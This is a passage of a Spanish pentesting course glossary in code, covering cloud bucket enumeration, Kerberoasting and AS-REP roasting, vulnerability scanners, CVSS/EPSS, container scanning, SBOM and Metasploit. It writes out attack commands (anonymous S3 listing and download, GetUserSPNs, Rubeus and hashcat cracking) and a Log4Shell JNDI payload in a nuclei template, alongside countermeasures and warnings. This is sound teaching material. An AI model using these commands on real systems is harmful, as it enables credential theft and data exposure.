    term: "Cloud enumeration: S3, Azure blobs, GCP buckets",
    short: "Enumerar buckets/blobs de cloud storage con permission scanning. Un bucket público es 'file browser as a service' para el atacante.",
    detail:
      "Los **cloud storage** (S3, Azure Blob, GCP Storage) tienen buckets/containers globalmente enumerables por naming convention. Un misconfig típico expone datos sin necesidad de credenciales.\n" +
      "\n**AWS S3 enumeration:**\n" +
      "\n**Naming conventions comunes:**\n" +
      "```\ntarget-backup, target-prod-backup, target-logs, target-static\ntarget.com, backup.target.com, static-target.s3.amazonaws.com\ntarget-dev, target-staging, target-test\n```\n" +
      "\n**Herramientas:**\n" +
      "• **s3scanner** — permutations + permission check\n" +
      "```bash\ns3scanner scan --buckets-file buckets.txt --provider aws\ns3scanner scan --bucket-name company-backup\n```\n" +
      "• **awscli** con anonymous:\n" +
      "```bash\naws s3 ls s3://target-backup --no-sign-request         # LIST anonymous\naws s3 cp s3://target-backup/file.txt . --no-sign-request  # DOWNLOAD\n```\n" +
      "• **cloud_enum** (autor: initstring) — enum multi-cloud:\n" +
      "```bash\ncloud_enum -k target -k targetcorp -k targetprod\n```\n" +
      "• **AWSBucketDump** — bruteforce con wordlist\n" +
      "\n**S3 misconfig levels:**\n" +
      "| ACL / Policy | Impact |\n" +
      "|---|---|\n" +
      "| Public read + list | 🔴 Data disclosure |\n" +
      "| Public read + list + write | 🚨 Web shell, malware distribution |\n" +
      "| Authenticated Users (any AWS) | 🟡 Any AWS user vs anonymous |\n" +
      "| Private + IAM excessive | 🟡 Insider risk |\n" +
      "\n**Azure Blob Storage:**\n" +
      "\n**Naming**: `{account}.blob.core.windows.net/{container}/{blob}`.\n" +
      "```bash\n# Anonymous read\ncurl https://targetcompany.blob.core.windows.net/backup?restype=container&comp=list\n```\n" +
      "Herramienta: **MicroBurst** (PowerShell), específica para Azure.\n" +
      "\n**GCP Cloud Storage:**\n" +
      "\n**Naming**: `storage.googleapis.com/{bucket}` o `gs://{bucket}`.\n" +
      "```bash\ngsutil ls gs://target-backup       # con creds\ncurl https://storage.googleapis.com/target-backup       # anonymous LIST\n```\nHerramienta: **GCPBucketBrute** (rhinosecuritylabs).\n" +
      "\n**Casos históricos (todos por public buckets):**\n" +
      "• **Uber 2016** — 57M records vía credentials leaked en repo público → acceso a S3.\n" +
      "• **Verizon 2017** — 14M records en S3 públic + backup config file.\n" +
      "• **Facebook Cambridge Analytica** — datos en S3 público.\n" +
      "• **Accenture 2017** — 4 buckets con creds y firmas exposed.\n" +
      "• **US voter data 2017** — 198M records en S3 público de un contractor GOP.\n" +
      "\n**Pipeline moderno de recon cloud:**\n" +
      "```bash\n# 1. Discovery\ncloud_enum -k target -k target-corp\n\n# 2. Verificación de acceso\ns3scanner scan --buckets-file discovered.txt\n\n# 3. Enumeración de contenido\naws s3 ls s3://target-backup --recursive --no-sign-request\n\n# 4. Búsqueda de secrets en downloaded content\ntrufflehog filesystem ./downloaded/\n```\n" +
      "> 💡 Bug bounty scope suele explícitamente incluir subdominios pero **NO buckets externos**. Confirmar antes de enumerar.\n" +
      "> ⚠️ Descargar contenido de un bucket público de otro (aunque sea abierto) puede violar leyes de privacidad. Solo LIST + reportar.",
    examples: [
      "Uber 2016: S3 breach costó $148M en settlements por incident del CSO.",
      "Bug bounty: reportar S3 público de la target company = típico $500-$5K según data.",
      "GCP: `gsutil iam get gs://target-backup` para ver policies (require creds).",
    ],
    related: ["OSINT", "Modelo de responsabilidad compartida", "S3 security", "SSRF y metadata cloud"],
  },
  {
    id: 308,
    module: 27,
    term: "Kerberoasting y AS-REP roasting",
    short: "Dos ataques offline contra Kerberos que solo requieren credentials de un usuario del dominio. Bug de diseño del RC4 en TGS.",
    detail:
      "**Kerberos** es el protocolo de auth default en Active Directory. Su diseño tiene 2 flaws explotables desde 2014-2015 con credentials de usuario:\n" +
      "\n**Kerberoasting (2014, Tim Medin):**\n" +
      "\n**Concepto**: cualquier user autenticado puede pedir un **TGS** (Ticket Granting Service) para cualquier **service account** (identificada por SPN). El TGS está **encriptado con el hash del password de la service account**. Offline cracking del ticket = password de la SA.\n" +
      "\n**Flow:**\n" +
      "1. User autentica → obtiene TGT.\n" +
      "2. User pide TGS para SPN `HTTP/webserver.corp.local`.\n" +
      "3. DC responde con TGS encriptado con hash(password de la SA).\n" +
      "4. Atacante extrae el TGS y crackea offline con hashcat.\n" +
      "\n**Herramientas:**\n" +
      "```bash\n# Impacket (Linux)\nGetUserSPNs.py CORP.LOCAL/user:password -dc-ip 10.0.0.1 -request\n\n# Rubeus (Windows post-compromise)\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# CrackMapExec / NetExec\nnxc ldap dc.corp.local -u user -p pass --kerberoasting hashes.txt\n\n# hashcat crack\nhashcat -m 13100 hashes.txt rockyou.txt\n```\n" +
      "\n**AS-REP Roasting (2015):**\n" +
      "\n**Concepto**: users con flag `DONT_REQ_PREAUTH` (UAC bit 4194304) no requieren pre-auth. El KDC responde AS-REP con hash del password del user (para preservar backward compat con Kerberos v4). Crackeable offline.\n" +
      "\n**Cuándo se ve**: apps legacy que no soportan pre-auth. Aplicaciones custom mal configuradas.\n" +
      "\n**Flow:**\n" +
      "1. Sin ninguna credential, atacante manda AS-REQ para usuarios candidatos.\n" +
      "2. Para users normales, KDC pide pre-auth (falla).\n" +
      "3. Para users con DONT_REQ_PREAUTH, KDC responde AS-REP con TGT cifrado con hash del password.\n" +
      "4. Crackeo offline.\n" +
      "\n**Herramientas:**\n" +
      "```bash\n# Impacket sin credentials\nGetNPUsers.py CORP.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1\n\n# Con credentials, enumerar quién es vulnerable\nGetNPUsers.py CORP.LOCAL/user:pass -request -dc-ip 10.0.0.1\n\n# Rubeus\nRubeus.exe asreproast /outfile:hashes.txt\n\n# hashcat\nhashcat -m 18200 hashes.txt rockyou.txt\n```\n" +
      "\n**Contramedidas:**\n" +
      "\n**Contra Kerberoasting:**\n" +
      "• Passwords muy largos (25+ chars) para service accounts.\n" +
      "• **gMSA / dMSA** (group Managed Service Accounts) — passwords managed automáticamente por AD, 240 chars rotados cada 30 días.\n" +
      "• Detección: alertar sobre requests inusuales de TGS (Event 4769 con encriptación RC4).\n" +
      "• AES-only Kerberos (deshabilitar RC4) fuerza AES tickets → hashcat mode 19700, cracking 100× más lento.\n" +
      "\n**Contra AS-REP Roasting:**\n" +
      "• Deshabilitar `DONT_REQ_PREAUTH` en TODOS los users.\n" +
      "• Passwords fuertes.\n" +
      "• Detección: Event 4768 con userType=Anonymous o pre-auth type=0.\n" +
      "\n> 💡 En pentest de AD, **el 90% de engagements** produce al menos 1 Kerberoastable con password crackeable en <24h.\n" +
      "> ⚠️ RC4 en Kerberos es hashable rápido (10M hashes/sec en GPU moderno). AES es 100× más lento.",
    examples: [
      "OSCP AD sets: Kerberoasting es camino canonical desde initial foothold a DA.",
      "Tim Medin's DerbyCon 2014 talk: introducción original de Kerberoasting.",
      "Blue Team detection: Sigma rule `T1558.003` de MITRE ATT&CK.",
    ],
    related: ["LDAP enumeration y BloodHound", "Active Directory: dominio, bosque y OU", "SMB enumeration profundo con CrackMapExec/NetExec", "AAA (Autenticación, Autorización, Accounting)"],
  },

  // ── M28 · Análisis de Vulnerabilidades ───────────────────────────────────
  {
    id: 310,
    module: 28,
    term: "Escáneres de vulnerabilidades",
    short: "Nessus, OpenVAS y nuclei automatizan la detección de fallos conocidos.",
    detail:
      "Un **escáner de vulnerabilidades** compara servicios/versiones contra bases de CVEs:\n" +
      "| Herramienta | Nota |\n" +
      "|---|---|\n" +
      "| Nessus | Comercial, muy completo |\n" +
      "| OpenVAS | Open source |\n" +
      "| nuclei | Basado en plantillas, rápido, CI-friendly |\n" +
      "> ⚠️ Generan **falsos positivos**: hay que validar manualmente antes de reportar.",
    examples: [
      "nuclei -u https://target con plantillas comunitarias.",
      "Un escaneo Nessus autenticado para mayor profundidad.",
    ],
    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Detección de servicio y OS"],
  },
  {
    id: 311,
    module: 28,
    term: "Análisis de vulnerabilidades",
    short: "No es solo escanear: es validar, contextualizar y priorizar los hallazgos.",
    detail:
      "Un **vulnerability assessment** identifica y clasifica debilidades, pero a diferencia de un **pentest** no necesariamente las explota. El valor está en **validar** (descartar falsos positivos), **contextualizar** (¿es alcanzable? ¿qué expone?) y **priorizar** la remediación.",
    examples: [
      "Confirmar manualmente que una vuln reportada es real.",
      "Diferenciar un assessment (amplio) de un pentest (profundo).",
    ],
    related: ["Escáneres de vulnerabilidades", "Priorización de remediación", "Gestión de riesgos"],
  },
  {
    id: 312,
    module: 28,
    term: "Priorización de remediación",
    short: "Arreglar primero lo crítico y explotable, no todo a la vez.",
    detail:
      "No todo se parchea a la vez. Se prioriza combinando **CVSS** (severidad), **explotabilidad real** (¿hay exploit público? ¿está en la **CISA KEV**?) y **exposición/contexto** (¿es alcanzable desde Internet?).\n" +
      "> 💡 Una CVSS 9.8 expuesta a Internet y en KEV va primero que una 9.0 interna sin exploit conocido.",
    examples: [
      "Priorizar una CVE en la lista KEV de CISA.",
      "Posponer una vuln alta pero inalcanzable tras la red interna.",
    ],
    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Gestión de riesgos"],
  },
  {
    id: 313,
    module: 28,
    term: "Assessment vs pentest",
    short: "El assessment lista y prioriza vulnerabilidades; el pentest las explota para demostrar impacto.",
    detail:
      "Dos servicios que se confunden:\n" +
      "• **Vulnerability assessment** — amplio, automatizado, sin explotar; responde '¿qué fallos tengo?'.\n" +
      "• **Penetration test** — profundo, manual, explota y encadena; responde '¿qué puede lograr un atacante real?'.\n" +
      "Un **red team** va más allá: simula un adversario con objetivos y sigilo.",
    examples: [
      "Assessment trimestral + pentest anual como combinación típica.",
      "Un pentest demuestra el impacto encadenando vulnerabilidades.",
    ],
    related: ["Análisis de vulnerabilidades"],
  },
  {
    id: 314,
    module: 28,
    term: "Nuclei y templates modernos",
    short: "Scanner YAML-based que corre 8000+ templates de la community. Reemplazo moderno de Nikto/OpenVAS para bug hunting.",
    detail:
      "**Nuclei** (ProjectDiscovery, 2020) es el scanner de vulnerabilidades moderno más adoptado. YAML-based, ultra rápido (paralelo), y con **community templates** actualizados diariamente para CVEs nuevas.\n" +
      "\n**Filosofía vs Nessus/OpenVAS:**\n" +
      "| | Nessus/OpenVAS | Nuclei |\n" +
      "|---|---|---|\n" +
      "| Templates | Pluggins C++ pagos/complejos | YAML simple |\n" +
      "| Community | Cerrado | 8000+ templates GitHub |\n" +
      "| Speed | Lento (secuencial) | Ultrarrápido (async Go) |\n" +
      "| Integration | GUI-first | CLI-first, pipeline-friendly |\n" +
      "| Focus | Compliance scanning | Bug hunting + web CVEs |\n" +
      "\n**Instalación + templates:**\n" +
      "```bash\ngo install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\nnuclei -update-templates          # baja ~8000 templates a ~/nuclei-templates/\n```\n" +
      "\n**Uso básico:**\n" +
      "```bash\n# Scan un target con todos los templates de alta severidad\nnuclei -u https://target.com -severity high,critical\n\n# Scan una lista de targets\nnuclei -l targets.txt -severity critical\n\n# Templates específicos (CVEs)\nnuclei -l targets.txt -t cves/2023/ -t cves/2024/\n\n# Templates por tag\nnuclei -l targets.txt -tags exposure,misconfig,sqli\n\n# Rate limiting responsable\nnuclei -l targets.txt -rate-limit 100 -c 20\n```\n" +
      "\n**Estructura de un template:**\n" +
      "```yaml\nid: log4shell-jndi\ninfo:\n  name: Log4Shell CVE-2021-44228\n  severity: critical\n  tags: cve,cve2021,rce,log4j\nrequests:\n  - method: GET\n    path:\n      - '{{BaseURL}}/'\n    headers:\n      User-Agent: '${jndi:ldap://{{interactsh-url}}/x}'\n    matchers:\n      - type: word\n        part: interactsh_protocol\n        words:\n          - 'dns'\n```\nEl `{{interactsh-url}}` es un dominio OAST único por scan; si el server hace lookup DNS al recibir el payload, el hit confirma vuln.\n" +
      "\n**Categorías de templates:**\n" +
      "```\ncves/           # CVEs específicas por año\nexposures/      # Files/paths expuestos (backup, .git, .env)\nmisconfigurations/  # CORS, permissive policies\ndefault-logins/ # Panels con creds default\nvulnerabilities/    # SSRF, LFI, SQLi específicos\ntechnologies/   # Detección de stacks\ntakeovers/      # Subdomain takeover vectors\n```\n" +
      "\n**Pipeline con ProjectDiscovery ecosystem:**\n" +
      "```bash\nsubfinder -d target.com | \\\n  dnsx -a | \\\n  httpx -status-code -title -tech-detect | \\\n  nuclei -t cves/ -severity critical,high\n```\n" +
      "\n**Custom templates:**\n" +
      "Puede detectar exposure de vuestro API interno:\n" +
      "```yaml\nid: internal-api-expose\ninfo:\n  name: Internal API v3 exposed to Internet\n  severity: high\nrequests:\n  - method: GET\n    path: ['{{BaseURL}}/api/v3/internal/debug']\n    matchers:\n      - type: status\n        status: [200]\n      - type: word\n        words: ['debug_token']\n```\n" +
      "\n**Interactsh — OAST infrastructure:**\nProjectDiscovery hostea `interact.sh` para blind detection. Casos: SSRF, XXE, Log4Shell, OS command injection. Sin infra propia.\n" +
      "\n> 💡 En bug bounty modernos, **nuclei + custom templates para el target-specific** es el workflow standard.\n" +
      "> ⚠️ Templates community pueden generar FALSOS POSITIVOS. Siempre verificar manualmente antes de reportar.",
    examples: [
      "Log4Shell (Dec 2021): templates de nuclei estuvieron en <24hrs después del disclosure.",
      "Bug bounty scale: nuclei con 10K targets + custom templates + interactsh = decenas de hallazgos.",
      "CI integration: `nuclei -l urls.txt -tags misconfig -j` con output JSON para parseo.",
    ],
    related: ["Análisis de vulnerabilidades", "CVE y CVSS", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "OWASP Top 10"],
  },
  {
    id: 315,
    module: 28,
    term: "CVSS 4.0 y EPSS",
    short: "CVSS 3.1 sigue siendo estándar, pero CVSS 4.0 (2023) mejora granularidad y EPSS predice probabilidad real de explotación.",
    detail:
      "**CVSS** (*Common Vulnerability Scoring System*, FIRST.org) es el estándar de scoring de vulnerabilidades. Evolución:\n" +
      "\n**CVSS 3.1 (2019)** — todavía dominante. 3 grupos métricos:\n" +
      "| Group | Ejemplos |\n" +
      "|---|---|\n" +
      "| **Base** | Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, C/I/A impact |\n" +
      "| **Temporal** | Exploit Code Maturity, Remediation Level, Report Confidence |\n" +
      "| **Environmental** | Modified metrics del cliente, requerimientos de C/I/A |\n" +
      "\nRango 0.0-10.0. Categorización: Low (0-3.9), Medium (4-6.9), High (7-8.9), Critical (9-10).\n" +
      "\n**CVSS 4.0 (Nov 2023)** — cambios clave:\n" +
      "• Nueva métrica **Attack Requirements (AT)** — condiciones preexistentes del target (más granular que AC).\n" +
      "• **User Interaction (UI)** subdividida en None/Passive/Active.\n" +
      "• Nuevo **Supplemental Metrics group**: Safety, Automatable, Recovery, Value Density, Vulnerability Response Effort, Provider Urgency.\n" +
      "• Elimina Environmental Modified metrics redundantes.\n" +
      "• Threat Metrics reemplazan Temporal — más orientado a inteligencia (Exploit Maturity, Report Confidence).\n" +
      "\n**Ejemplo CVSS 4.0 vector:**\n" +
      "```\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H\n```\n" +
      "\n**EPSS — Exploit Prediction Scoring System (FIRST.org):**\n" +
      "\n**Concepto**: en vez de qué tan malo *puede* ser (CVSS), EPSS predice **la probabilidad de que sea explotado en los próximos 30 días** basado en:\n" +
      "• CVE metadata (age, description, vendor, product)\n" +
      "• Public exploit availability\n" +
      "• Frequency de menciones en threat intel\n" +
      "• Scanner detections en la wild\n" +
      "• Score histórico (ML training sobre >100K CVEs)\n" +
      "\n**Sale como probabilidad (0-1)** con percentile. Consultable:\n" +
      "```bash\ncurl https://api.first.org/data/v1/epss?cve=CVE-2023-1234\n# Response: { epss: 0.9711, percentile: 0.99999 }\n```\n" +
      "\n**Priorización combinada (moderno):**\n" +
      "```\nCVSS solo:         'todas las críticas primero' → miles\nCVSS + KEV:        criticas + confirmadas explotadas → cientos\nCVSS + EPSS >0.5:  críticas + probables → decenas\nCVSS + KEV + EPSS + exposure interno: → decisión accionable\n```\n" +
      "\n**KEV (CISA Known Exploited Vulnerabilities):**\nCatalogo público mantenido por CISA (US) desde 2021. Lista **~1200 CVEs confirmadas explotadas** (evidencia observada). Requerido remediation en 2-4 semanas para agencias US federales.\n" +
      "```bash\ncurl https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json | jq\n```\n" +
      "\n**Herramientas modernas de priorización:**\n" +
      "• **Rapid7 InsightVM** — integra EPSS + KEV nativo\n" +
      "• **Wiz** (cloud CSPM) — attack path analysis + EPSS scoring\n" +
      "• **Vulncheck** — enriquecimiento de CVE con EPSS + exploit intel\n" +
      "• **Nuclei ranking**: templates ya tagean severity por CVSS y linkean a EPSS.\n" +
      "\n> 💡 CVSS solo tiene **overrating chronic**: ~40% de 'critical' nunca son explotadas. EPSS filtra ruido.\n" +
      "> ⚠️ CVSS 4.0 adoption es lenta — NIST NVD sigue publicando CVSS 3.1 principalmente. Interoperabilidad es un tema en 2024-2025.",
    examples: [
      "Log4Shell: CVSS 10.0 + EPSS 0.97 + KEV catalog = prioridad máxima obvia.",
      "OpenSSL CVE-2022-3602 (Punycode) — CVSS 9.8 pero EPSS 0.001 → no vulnerable en la wild → prioridad menor.",
      "CISA BOD 22-01: US Federal agencies must patch KEV entries in 2-4 weeks.",
    ],
    related: ["Análisis de vulnerabilidades", "Nuclei y templates modernos", "OWASP Top 10", "Vulnerable and Outdated Components"],
  },
  {
    id: 316,
    module: 28,
    term: "Container y Kubernetes vulnerability scanning",
    short: "Trivy, Grype, Kubescape para escanear imágenes y clusters. Un pentester moderno debe cubrir infra containerizada.",
    detail:
      "**Container security scanning** cubre 3 dimensiones: (1) vulns en imágenes, (2) misconfigs en manifests K8s, (3) runtime posture del cluster.\n" +
      "\n**Trivy** (Aqua Security, open source):\nEl estándar de facto. Escanea imágenes, filesystems, K8s clusters, IaC (Terraform), SBOM.\n" +
      "```bash\n# Imagen Docker\ntrivy image nginx:1.20\n\n# Filesystem local\ntrivy fs /path/to/project\n\n# Cluster K8s (todos los pods)\ntrivy k8s --report summary cluster\n\n# Terraform / IaC\ntrivy config /path/to/terraform/\n\n# Generar SBOM (CycloneDX)\ntrivy image --format cyclonedx --output sbom.json nginx:1.20\n```\n" +
      "Output separa **OS vulns** (paquetes del base image) vs **App vulns** (dependencies del lenguaje). Filter con `--severity CRITICAL,HIGH`.\n" +
      "\n**Grype** (Anchore, complementario):\nSimilar a Trivy, DB propia. Combinable con **Syft** para SBOM generation.\n" +
      "```bash\nsyft nginx:1.20 -o cyclonedx-json > sbom.json\ngrype sbom:sbom.json\n```\n" +
      "\n**Kubescape** (CNCF):\nFocus en misconfigs K8s + posture:\n" +
      "```bash\nkubescape scan --submit --enable-host-scan\nkubescape scan framework nsa\nkubescape scan framework MITRE\n```\nOutput contra frameworks NSA/CISA Hardening Guide o MITRE ATT&CK for K8s.\n" +
      "\n**Falco** (runtime, ya visto en M47 sprint):\nComplemento del scanning: detect en runtime (shells en pods, escapes, exec de nc/curl).\n" +
      "\n**Checkov** (Bridgecrew, Prisma):\nIaC scanning muy adoptado en pipelines.\n" +
      "```bash\ncheckov -d /terraform/          # Terraform\ncheckov -f k8s-manifest.yaml    # K8s YAML\ncheckov --framework kubernetes,dockerfile,terraform ./\n```\n1000+ policies built-in (CIS Benchmarks, PCI-DSS, HIPAA, SOC 2).\n" +
      "\n**kube-bench** (Aqua):\nCorre el CIS Kubernetes Benchmark contra tu cluster:\n" +
      "```bash\nkube-bench run --targets master,node,etcd\n```\n\n**kube-hunter**:\nActive penetration testing del cluster: intenta acceso al API server, kubelet, tokens.\n" +
      "```bash\nkube-hunter --remote target-cluster.example.com\n```\n\n**Snyk Container** (comercial pero freemium):\nIntegración fuerte con GitHub PRs, con base propia enriquecida con threat intel.\n" +
      "\n**Docker Bench Security** (script bash):\nAntiguo pero útil para hardening del daemon Docker en host Linux.\n" +
      "\n**Workflow moderno de shift-left:**\n" +
      "```\ndev → Trivy en dev/pre-commit hook\nCI → Trivy en build, fail on HIGH+\nregistry → Trivy scan on push (Harbor, ECR)\ndeploy → admission controller (Kyverno/OPA) verifica firmas cosign\nruntime → Falco detecta anomalías\ncluster → Kubescape mensual\n```\n" +
      "> 💡 **Trivy es el swiss-army knife moderno** — cubre 70% de casos con una sola tool.\n" +
      "> ⚠️ **False positives en base images** son comunes — muchas 'HIGH' son vulns en libraries no usadas por la app real. Contextualizar antes de sonar la alarma.",
    examples: [
      "GitLab CI: `trivy image --exit-code 1 --severity CRITICAL $CI_REGISTRY_IMAGE` fails builds on critical.",
      "Log4Shell response: Trivy pushed template en <24hrs, Kubescape añadió NSA Hardening reference en semana.",
      "GitHub advanced security: Dependabot + Trivy combined coverage.",
    ],
    related: ["Análisis de vulnerabilidades", "Image scanning", "Seguridad de Docker e imágenes", "Kubernetes security (RBAC)"],
  },
  {
    id: 317,
    module: 28,
    term: "OpenVAS/GVM y Nessus workflow moderno",
    short: "Los scanners 'legacy' (Nessus, OpenVAS) siguen dominantes en enterprise compliance. Cuándo y cómo usarlos vs. nuclei.",
    detail:
      "Nuclei es superior en velocidad y bug hunting, pero **Nessus y OpenVAS** siguen siendo estándar en enterprise por:\n" +
      "• **Compliance scanning** (PCI-DSS, HIPAA, DISA STIGs) — requerido en auditorías\n" +
      "• **Authenticated scans** con credentials para checks internos (patches, config)\n" +
      "• **Reporting profesional** para clientes que esperan Nessus-style reports\n" +
      "\n**Nessus (Tenable, comercial):**\n" +
      "\nProduct suite:\n" +
      "• **Nessus Essentials** — free, 16 IPs, sin compliance templates.\n" +
      "• **Nessus Professional** — ~$3500/año, unlimited IPs, todas las policies.\n" +
      "• **Tenable.io / Tenable.sc** — cloud/on-prem plataforma enterprise.\n" +
      "\n**Types of scans:**\n" +
      "```\nBasic Network Scan          # discovery + vulns unauth\nAdvanced Scan               # custom, full control\nCredentialed Patch Audit    # con SSH/SMB creds → checks internos\nCompliance Scan             # DISA STIGs, CIS Benchmarks, PCI-DSS\nWeb Application Test        # crawler + SAST-like checks\n```\n" +
      "\n**Credentialed scan value:**\nSin creds ves ~30% de vulns (banner-based). Con creds ves 100% (patch levels, misconfigs, weak configs). Diferencia enorme.\n" +
      "\n**OpenVAS / Greenbone Vulnerability Manager (GVM):**\nFork de Nessus 3 (última versión open source, 2005). Mantenido por Greenbone. Community Edition gratis.\n" +
      "\n**Instalación (Docker):**\n" +
      "```bash\ndocker run -d -p 9392:9392 --name gvm immauss/openvas\n# Web UI en https://localhost:9392\n```\n" +
      "\n**Feeds:**\n" +
      "• **GCF** (Community Feed) — gratis, NVTs (Network Vulnerability Tests) básicos.\n" +
      "• **GEF** (Enterprise Feed) — paid, más NVTs + compliance profundo.\n" +
      "\n**GVM workflow (CLI vía `gvm-cli`):**\n" +
      "```bash\n# Crear target\ngvm-cli --gmp-username admin --gmp-password admin socket --xml \\\n  '<create_target><name>target</name><hosts>10.0.0.5</hosts></create_target>'\n\n# Crear task (scan config = 'Full and fast')\n# ... iterar por API o GUI\n```\n" +
      "\n**Comparación práctica:**\n" +
      "| | Nessus | OpenVAS/GVM | Nuclei |\n" +
      "|---|---|---|---|\n" +
      "| Costo | $$$ | Gratis | Gratis |\n" +
      "| Compliance templates | ✅ (DISA STIGs, PCI, HIPAA) | ✅ (limitados) | ❌ |\n" +
      "| Credentialed scans | ✅ excelente | ✅ ok | ❌ (solo unauth) |\n" +
      "| Speed | Medio | Lento | Muy rápido |\n" +
      "| Web CVEs modernas | Ok, lag | Lag | Actualización diaria |\n" +
      "| Bug hunting | Ok | Ok | Excelente |\n" +
      "| Enterprise reporting | ✅ estándar | Ok | Requiere post-processing |\n" +
      "\n**Workflow enterprise combinado:**\n" +
      "1. **Nuclei** en bug hunting / recon inicial (fast, web-focused).\n" +
      "2. **Nessus/OpenVAS** en assessment interno con creds (compliance + coverage).\n" +
      "3. **Trivy/Grype** en containers.\n" +
      "4. **Manual pentest** para business logic + advanced.\n" +
      "\n**Rapid7 Nexpose / InsightVM:**\nOtro heavyweight enterprise. Menos usado que Nessus fuera de mercados verticales.\n" +
      "> 💡 En un pentest engagement, **Nessus authenticated scan** cubre 80% del compliance framework requirements automáticamente.\n" +
      "> ⚠️ False positives comunes en Nessus/OpenVAS (~10-20%). Requiere validation manual antes de reportar.",
    examples: [
      "Enterprise: 'certificate PCI-DSS ASV scan' — Tenable/Qualys certified.",
      "OSCP no permite scanners automatizados como Nessus — solo herramientas del CLI.",
      "GVM community edition + custom NVTs para checks propietarios.",
    ],
    related: ["Análisis de vulnerabilidades", "Nuclei y templates modernos", "CVSS 4.0 y EPSS", "Container y Kubernetes vulnerability scanning"],
  },
  {
    id: 318,
    module: 28,
    term: "SBOM, SCA moderna y supply chain scanning",
    short: "Software Bill of Materials + Software Composition Analysis. Post-Log4Shell, es requerimiento legal en muchos sectores.",
    detail:
      "**SBOM** (*Software Bill of Materials*) es el 'inventario nutricional' del software: lista todos los componentes (dependencies transitivas incluidas), sus versiones y proveedores. **SCA** (*Software Composition Analysis*) es el análisis de esa lista contra CVEs.\n" +
      "\n**Post-SolarWinds (2020) + Log4Shell (2021)**, EEUU (Executive Order 14028), UE (NIS2), y sectores regulados (healthcare, finance) **requieren SBOM** en delivery de software.\n" +
      "\n**Formatos estándar:**\n" +
      "| Formato | Origen | Uso |\n" +
      "|---|---|---|\n" +
      "| **CycloneDX** | OWASP | Más popular, extensible, VEX-friendly |\n" +
      "| **SPDX** | Linux Foundation | Más viejo, licencia-focused |\n" +
      "| **SWID** | ISO/IEC 19770-2 | Software identification tags |\n" +
      "\n**Generación de SBOM:**\n" +
      "```bash\n# Syft (Anchore) — el más versátil\nsyft nginx:1.20 -o cyclonedx-json > nginx-sbom.json\nsyft /path/to/project -o spdx-json > project-sbom.json\n\n# Trivy\ntrivy image --format cyclonedx nginx:1.20 > sbom.json\n\n# CycloneDX CLI\ncyclonedx-cli convert --input-file input.spdx --output-format json\n\n# Language-specific\nnpm sbom --sbom-format=cyclonedx    # npm 10+\nmvn cyclonedx:makeAggregateBom      # Maven\n```\n" +
      "\n**Análisis (SCA) del SBOM:**\n" +
      "```bash\n# Grype contra SBOM\ngrype sbom:nginx-sbom.json\n\n# Trivy SBOM scan\ntrivy sbom nginx-sbom.json\n\n# Dependency-Track (OWASP, self-hosted)\ncurl -X POST 'https://dtrack.example.com/api/v1/bom' \\\n  -H 'X-Api-Key: KEY' \\\n  -F 'project=uuid' \\\n  -F 'bom=@nginx-sbom.json'\n```\n" +
      "\n**Herramientas SCA populares:**\n" +
      "\n**Enterprise / SaaS:**\n" +
      "• **Snyk** — best UX, PR integration fuerte\n" +
      "• **GitHub Dependabot** — free en GitHub public repos\n" +
      "• **Sonatype Nexus / Lifecycle** — legal + license compliance\n" +
      "• **JFrog Xray** — integra con Artifactory\n" +
      "• **Mend (WhiteSource)** — enterprise pesado\n" +
      "• **Veracode SCA** — enterprise\n" +
      "\n**Open source:**\n" +
      "• **OWASP Dependency-Check** — el clásico, integrable en pipelines\n" +
      "• **OWASP Dependency-Track** — self-hosted SBOM + tracking + notifications\n" +
      "• **Grype + Syft** — combo moderno de Anchore\n" +
      "• **Trivy** — todo-en-uno\n" +
      "\n**VEX (Vulnerability Exploitability eXchange):**\n" +
      "\nProblema: la lib X en tu SBOM tiene CVE-2023-1234, pero **NO usás la function afectada**. El vuln existe pero no es explotable en tu context.\n" +
      "\nVEX es una declaración estándar: *'para esta CVE en este componente, mi status es not_affected because {reason}'*.\n" +
      "```json\n{\n  \"vulnerabilities\": [{\n    \"id\": \"CVE-2023-1234\",\n    \"analysis\": {\n      \"state\": \"not_affected\",\n      \"justification\": \"vulnerable_code_not_in_execute_path\",\n      \"detail\": \"App doesn't use libX.deserialize() function\"\n    }\n  }]\n}\n```\n" +
      "Elimina alertas false positive at scale.\n" +
      "\n**Threat intel enrichment:**\n" +
      "• **VulnCheck** — cross-references CVE + EPSS + KEV + exploit availability\n" +
      "• **First.org EPSS** — probabilidad de explotación\n" +
      "• **CISA KEV** — confirmed exploited in wild\n" +
      "\n> 💡 **El Federal Government US requiere SBOM en todas las adquisiciones de software desde 2023** (EO 14028). Sector privado siguió.\n" +
      "> ⚠️ SBOM sin update es peor que no tener: la CVE nueva del mes no aparece. Automatizar generation en cada release.",
    examples: [
      "Post-SolarWinds: >30 países legislaron requerimientos SBOM en gov procurement.",
      "OWASP Dependency-Track self-hosted: dashboards para tracking de vulns per project across time.",
      "npm 10 nativo SBOM: `npm sbom` genera CycloneDX out-of-the-box.",
    ],
    related: ["Análisis de vulnerabilidades", "CVSS 4.0 y EPSS", "Vulnerable and Outdated Components", "Nuclei y templates modernos"],
  },

  // ── M29 · Metasploit Framework ───────────────────────────────────────────
  {
    id: 320,
    module: 29,
    term: "Arquitectura de Metasploit",
    short: "El framework organiza exploits, payloads y módulos auxiliares bajo msfconsole.",
    detail:
      "**Metasploit** es el framework de explotación de referencia. Sus piezas:\n" +
      "• **Exploit** — código que aprovecha una vulnerabilidad.\n" +
      "• **Payload** — lo que se ejecuta tras explotar (shell, Meterpreter).\n" +
      "• **Auxiliary** — escáneres, fuzzers, módulos sin payload.\n" +
      "• **Encoder / NOP** — para evasión.\n" +
      "Todo se maneja desde **msfconsole**.",
    examples: [
      "search type:exploit smb para encontrar módulos.",
      "Un módulo auxiliary para hacer brute force de SSH.",
    ],
    related: ["Payloads y Meterpreter", "Exploit y Payload"],
  },
  {
    id: 321,
    module: 29,
    term: "Payloads y Meterpreter",
    short: "El payload es lo que corre tras el exploit; Meterpreter es el más potente.",
    detail:
